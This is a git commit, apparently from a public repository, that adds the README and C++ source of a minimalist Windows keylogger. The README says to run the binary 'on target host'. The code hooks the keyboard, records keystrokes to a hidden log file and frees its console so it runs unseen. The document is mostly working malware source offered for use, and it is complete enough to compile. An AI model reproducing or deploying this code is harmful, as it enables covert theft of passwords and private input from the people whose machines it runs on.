daf86d10d4b99a56d95b11dd501a7e4d83042bb2
pgpgeek <dave-hill@dyrk.org>
2020-07-24 11:53:01 +0200

    first commit

--- README.md
+++ README.md
@@ -1,1 +1,16 @@
 # MinimalistKeyLogger
+
+Hello this project is a minimalist keylogger for **WINDOWS**.
+
+- Compile it
+- Run the binary on target host
+- A file will be generated and filled with the keyboard input
+
+
+**_KEYLOG_FILENAME_** : is the filename of the log file 
+
+
+Compile with static library :
+-static-libgcc -static-libstdc++
+
+Test succefull on  Win10 but detected as Trojan (But it's not a suprise)
---
+++ main.cpp
@@ -0,0 +1,109 @@
+/*
+*
+*
+*   Minimalist { Windows } KeyLogger
+*   (c) Dyrk.org 2019 - 2020
+*
+*
+*/
+
+/*
+*
+*   Header File
+*
+*
+*
+**/
+#include <Windows.h>
+#include <stdio.h>
+#include <sys/stat.h>
+#include <ctype.h>
+
+#define _CRT_SECURE_NO_DEPRECATE
+#define _KEYLOG_FILENAME_ "keyboard.log"
+
+int getKeyPressed();
+bool appendFile(char *filename, char letter);
+bool logFileExist(char *filename);
+void createFile(char *filename, bool hidden);
+
+/*
+*
+*   Main File
+*
+*
+*
+**/
+
+// Hook to detect Keyboard Event - Need GetMessage to Work
+LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam,LPARAM lParam){
+    int key;
+    key = getKeyPressed();
+    if (key >=32){
+        appendFile(_KEYLOG_FILENAME_, key);
+    }
+    return CallNextHookEx(NULL, code, wParam, lParam);
+}
+
+
+// Quick way to detect if File exist
+bool logFileExist(char *filename){
+    struct stat buffer;
+    return (stat (filename, &buffer) == 0);
+}
+
+
+// Create Hidden File
+void createFile(char *filename, bool hidden){
+    FILE *pFile;
+    if (logFileExist(filename) == false){
+        pFile = fopen(filename, "w");
+        fprintf(pFile, "");
+        fclose(pFile);
+        if (hidden == true){
+            DWORD attributes = GetFileAttributes(filename);
+            SetFileAttributes(filename, FILE_ATTRIBUTE_HIDDEN);
+        }
+    }
+}
+
+
+// add text in file
+bool appendFile(char *filename, char letter){
+    FILE *pFile;
+    pFile = fopen(filename, "a+");
+    if (pFile != NULL) {
+        fprintf(pFile, "%c", letter);
+        fclose(pFile);
+        return true;
+    }
+    return false;
+}
+
+
+// detect the pressed key
+int getKeyPressed(){
+    int key = 0;
+    for (int i = 32; i <= 90; i++) {
+        key = i;
+        if (GetAsyncKeyState(i) ==-32767) {
+            if (GetAsyncKeyState(VK_LSHIFT) !=-32767 && i >=65 && i<=90) {
+                key = i +32;
+            }
+            return key;
+        }
+    }
+    return -1;
+}
+
+
+int main() {
+    MSG msg;
+    bool bRet;
+    SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+    createFile(_KEYLOG_FILENAME_, true);
+    FreeConsole();
+    while ((bRet = GetMessage( &msg, NULL, 0, 0 )) != 0){
+    }
+}
+
